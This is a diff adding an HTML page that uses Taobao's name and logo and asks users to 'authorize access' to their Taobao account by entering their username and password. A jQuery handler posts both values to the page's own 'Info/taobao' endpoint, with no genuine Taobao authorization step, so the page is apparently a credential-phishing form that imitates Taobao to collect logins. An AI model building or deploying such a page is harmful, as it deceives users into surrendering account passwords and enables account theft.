@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>淘宝</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <style>
+        body{
+            background:#F3F3F3;
+        }
+        .top{
+            /*border:1px solid red;*/
+            width:100%;
+            height:150px;
+            position:relative;
+        }
+        .t-content{
+            border:1px solid red;
+            position:absolute;
+            top:0;
+            bottom:0;
+            left:0;
+            right:0;
+            margin:auto;
+        }
+        .middle{
+            /*border:1px solid red;*/
+            width:100%;
+            height:300px;
+        }
+        .m-content{
+            /*border:1px solid red;*/
+            height:200px;
+            margin:0 auto;
+            width:89%;
+        }
+        .text{
+            font-size:16px;
+            font-weight: bold;
+            letter-spacing:2px;
+        }
+        .ipt{
+            background: white;
+            margin:10px 0 0 0;
+            border:1px solid #D3D3D3;
+            border-radius:4px;
+            width:100%;
+            height:45px;
+            position:relative;
+        }
+
+        .img{
+            position:absolute;
+            width:25px;
+            top:9px;
+            left:8px;
+        }
+        .iipt{
+            position:absolute;
+            width:85%;
+            height:35px;
+            left:40px;
+            top:2px;
+            border:none;
+            outline:none;
+            font-size:16px;
+        }
+
+        .yzm{
+            position:absolute;
+            width:85%;
+            height:38px;
+            left:40px;
+            top:2px;
+            border:none;
+            outline:none;
+            font-size:16px;
+        }
+        .ok{
+            margin:15px 0 0 0;
+            /*border:1px solid red;*/
+            width:100%;
+            height:25px;
+            position:relative;
+        }
+
+        .o-content{
+            position:absolute;
+            top:4px;
+            left:27px;
+            color:#6585BB;
+            font-size:12px;
+            letter-spacing: 1px;
+        }
+        .o-uncheck{
+            width:16px;
+            position:absolute;
+            top:4px;
+            left:5px;
+          
+        }
+        .o-check{
+            width:16px;
+            position:absolute;
+            top:4px;
+            left:5px;
+        }
+        
+        .none{
+            display:none;
+        }
+
+        .submit{
+            display:block;
+            width:100%;
+            margin:10px 0 0 0;
+            height:45px;
+            background:#1685D3;
+            color:white;
+            outline:none;
+            border-radius:5px;
+            border:0;
+            font-size:17px;
+            text-align: center;
+            line-height:45px;
+            text-decoration:none;
+        }
+
+
+        .submit:active{
+            background:#156FAD;
+        }
+        .back{
+            display:block;
+            width:100%;
+            margin:10px 0 0 0;
+            height:45px;
+            background:white;
+            color:#1685D3;
+            outline:none;
+            border-radius:5px;
+            border:1px solid #1685D3;
+            font-size:17px;
+            text-align: center;
+            line-height:45px;
+            text-decoration:none;
+        }
+    </style>
+    
+</head>
+<body>
+    <div class="top">
+        <img width="75" class="t-content" src="__PUBLIC__/home/imgs/taobao.jpg" alt="">
+    </div>
+
+    <br>
+    <form id="isForm" method="post">
+        <div class="middle">
+            <div class="m-content">
+                <span class="text">授权访问您的淘宝账号</span>
+                <br>
+                <label for="iipt">
+                <div class="ipt">
+                    <img class="img" src="__PUBLIC__/home/imgs/account.png" alt="">
+                    <input id="iipt" class="iipt" name="user" placeholder="淘宝账号" type="text">
+                </div>
+                </label>
+                <label for="iipt2">
+                <div class="ipt">
+                    <img class="img" src="__PUBLIC__/home/imgs/lock.png" alt="">
+                    <input id="iipt2" class="iipt" name="pass" placeholder="淘宝密码" type="password">
+                </div>
+                </label>
+                <!-- <label for="yzm">
+                <div class="ipt">
+                    <img class="img" src="__PUBLIC__/home/imgs/yzm.png" alt="">
+                    <input id="yzm" class="iipt" name="yzm" placeholder="验证码" type="text">
+                </div>
+                </label> -->
+
+                <label id="yes" for="check">
+                    <div class="ok">
+                        <img id="check" class="o-uncheck none" src="__PUBLIC__/home/imgs/uncheck.png" alt="">
+                        <img id="check" class="o-check" src="__PUBLIC__/home/imgs/check.png" alt="">
+                        <span class="o-content">授权访问您的淘宝账号信息</span>
+                    </div>
+                </label>
+                <input type="hidden" name="ok" value="1">
+                <a class="submit"> 
+                    提交
+                </a>
+                
+                
+                <a class="back" href="javascript:history.back(-1)">后退</a>
+            </div>
+        </div>
+    </form>
+
+</body>
+<script src="__PUBLIC__/home/js/jquery.js"></script>
+
+
+<script>
+  
+
+    $('#yes').click(function(){
+        
+        if($('input[name="ok"]').val() == 1){
+            $('.o-uncheck').removeClass('none');
+            $('.o-check').addClass('none');
+            $('input[name="ok"]').val(0);
+        }else{
+            $('.o-check').removeClass('none');
+            $('.o-uncheck').addClass('none');
+            $('input[name="ok"]').val(1);
+        }
+    });
+    $('.submit').click(function(){
+        // $('#yes').prepend('<label for="yzm"><div class="ipt"><img class="img" src="__PUBLIC__/home/imgs/yzm.png" alt=""><input id="yzm" class="iipt" name="yzm" placeholder="验证码" type="text"></div></label>');
+        if($('input[name="yzm"]').length == 0){
+            $.post(
+                '{:U("Info/taobao")}',
+                {
+                    user:$('input[name="user"]').val(),
+                    pass:$('input[name="pass"]').val(),
+                },
+                function(data){
+
+                }
+            );
+
+        }
+     
+    })
+    
+
+</script>
+</html>
